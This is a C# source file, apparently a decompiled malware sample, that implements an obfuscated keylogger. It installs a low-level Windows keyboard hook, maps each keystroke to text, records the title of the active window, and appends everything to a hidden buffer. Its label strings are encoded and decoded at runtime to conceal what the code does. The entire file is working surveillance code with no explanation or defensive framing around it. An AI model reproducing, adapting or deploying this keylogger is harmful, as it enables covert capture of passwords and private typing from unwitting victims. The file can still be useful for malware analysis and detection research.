using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class FLOUNLNG
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref ENKDHQ lParam);

	public struct ENKDHQ
	{
		public int VMFWJI;

		public int TGLGWP;

		public int JKVPXN;

		public int IVHHFJ;

		public int BSVHRK;
	}

	private string output;

	private static IntPtr WGXVL = (IntPtr)0;

	private static string MTVKF = "";

	private static KeyboardHookDelegate OGCWDQ = null;

	public static string URWWKD(IntPtr hWnd)
	{
		string result = default(string);
		try
		{
			if (hWnd.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(hWnd);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)hWnd, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool XURKBF()
	{
		bool result = default(bool);
		try
		{
			result = WGXVL != (IntPtr)0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void PMRWJIIE()
	{
		try
		{
			OGCWDQ = KYBRDLCK;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			WGXVL = (IntPtr)SetWindowsHookExA(13, OGCWDQ, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void IKEPD()
	{
		try
		{
			if (XURKBF() && UnhookWindowsHookEx((int)WGXVL) != 0)
			{
				WGXVL = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	public static int KYBRDLCK(int Code, int WPA, ref ENKDHQ LPA)
	{
		try
		{
			string text = URWWKD(GetForegroundWindow());
			if (Operators.CompareString(text, MTVKF, false) != 0)
			{
				MTVKF = text;
				CMFVPTX.GXDYQP = CMFVPTX.GXDYQP + Environment.NewLine + WOGVCL.TGKKNH("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + WOGVCL.TGKKNH("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			string text2 = "";
			if (WPA == 256 || WPA == 260)
			{
				checked
				{
					switch (LPA.VMFWJI)
					{
					case 8:
						CMFVPTX.GXDYQP = CMFVPTX.GXDYQP.Substring(0, CMFVPTX.GXDYQP.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? WOGVCL.TGKKNH("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : WOGVCL.TGKKNH("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = WOGVCL.TGKKNH("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = WOGVCL.TGKKNH("RyA=", "False");
						break;
					case 35:
						text2 = WOGVCL.TGKKNH("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = WOGVCL.TGKKNH("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = WOGVCL.TGKKNH("U6mVvXIT", "False");
						break;
					case 38:
						text2 = WOGVCL.TGKKNH("SJ6ssmce", "False");
						break;
					case 39:
						text2 = WOGVCL.TGKKNH("X7WjyX4H", "False");
						break;
					case 40:
						text2 = WOGVCL.TGKKNH("O5GXpVor", "False");
						break;
					case 46:
						text2 = WOGVCL.TGKKNH("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = WOGVCL.TGKKNH("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(WOGVCL.TGKKNH("VBM=", "False")) });
							switch (LPA.VMFWJI)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(LPA.VMFWJI);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(LPA.VMFWJI + 32).ToLower() : char.ConvertFromUtf32(LPA.VMFWJI + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = WOGVCL.TGKKNH("UaedGA==", "False") + Conversions.ToString(LPA.VMFWJI - 111) + WOGVCL.TGKKNH("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = WOGVCL.TGKKNH("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = WOGVCL.TGKKNH("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("cBI=", "False") : WOGVCL.TGKKNH("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("WSs=", "False") : WOGVCL.TGKKNH("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("YhE=", "False") : WOGVCL.TGKKNH("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("cAQ=", "False") : WOGVCL.TGKKNH("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("ZRA=", "False") : WOGVCL.TGKKNH("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("aQ0=", "False") : WOGVCL.TGKKNH("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("lBM=", "False") : WOGVCL.TGKKNH("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(LPA.VMFWJI);
						break;
					case 219:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("mgg=", "False") : WOGVCL.TGKKNH("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("czA=", "False") : WOGVCL.TGKKNH("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("gSM=", "False") : WOGVCL.TGKKNH("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? WOGVCL.TGKKNH("bQE=", "False") : WOGVCL.TGKKNH("Ths=", "False"));
						break;
					}
					CMFVPTX.GXDYQP += text2;
					CMFVPTX.IKKVKS = CMFVPTX.GXDYQP;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, StringBuilder lpString, int cch);

	public FLOUNLNG(string output)
	{
		try
		{
			this.output = output;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
